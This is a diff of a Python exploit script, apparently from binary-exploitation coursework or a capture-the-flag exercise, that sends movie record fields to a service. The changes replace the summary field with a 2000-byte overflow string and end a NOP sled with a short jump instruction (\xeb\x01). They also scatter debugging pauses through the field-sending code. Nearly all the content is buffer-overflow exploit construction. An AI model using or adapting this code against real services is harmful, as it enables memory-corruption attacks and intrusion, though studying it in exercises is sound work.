@@ -142,14 +142,15 @@ def send_movie(movie,con):
 
     # Send all the data in order
     con.send_line(movie["title"])
-    pause_script()
+    #pause_script()
     con.send_line(movie["director"])
     con.send_line(movie["star1"])
     con.send_line(movie["star2"])
     con.send_line(movie["star3"])
     con.send_line(movie["star4"])
     con.send_line(movie["star5"])
-    con.send_line(movie["summary"])
+    #con.send_line(movie["summary"])
+    con.send(build_string("a", 2000))
     con.send_line(movie["country"])
     con.send_line(movie["budget"])
     con.send_line(movie["opening_weekend"])
@@ -173,21 +174,37 @@ def send_movie_max(movie,con):
 
     # Send all the data in order
     con.send(movie["title"])
+    pause_script()
     con.send(movie["director"])
+    pause_script()
     con.send(movie["star1"])
+    pause_script()
     con.send(movie["star2"])
+    pause_script()
     con.send(movie["star3"])
+    pause_script()
     con.send(movie["star4"])
+    pause_script()
     con.send(movie["star5"])
+    pause_script()
     con.send(movie["summary"])
+    pause_script()
     con.send(movie["country"])
+    pause_script()
     con.send(movie["budget"])
+    pause_script()
     con.send(movie["opening_weekend"])
+    pause_script()
     con.send(movie["gross"])
+    pause_script()
     con.send(movie["runtime"])
+    pause_script()
     con.send(movie["aspect"])
+    pause_script()
     con.send(movie["composer"])
+    pause_script()
     con.send(movie["average_rating"])
+    pause_script()
 
 ################################################################################
 #
@@ -226,9 +243,26 @@ def build_nop_string(size):
     nop_string = ""
 
     for i in range(0, size):
-        nop_string += NOP
+        if i == (size - 2):
+            nop_string += "\xeb\x01"
+            return nop_string
+        else:
+            nop_string += NOP
 
     return nop_string
+
+################################################################################
+#
+#   build_string
+#
+################################################################################
+def build_string(string, size):
+    built_string = ""
+
+    for i in range(0, size):
+        built_string += string
+
+    return built_string
 
 ################################################################################
 #
@@ -285,11 +319,12 @@ def build_movie():
 # Start the connection
 con = connect()
 
-#pause_script()
-
+pause_script()
 
 movie = build_movie()
 send_movie(movie, con)
+
+pause_script()
 
 #go_interactive(con)
 
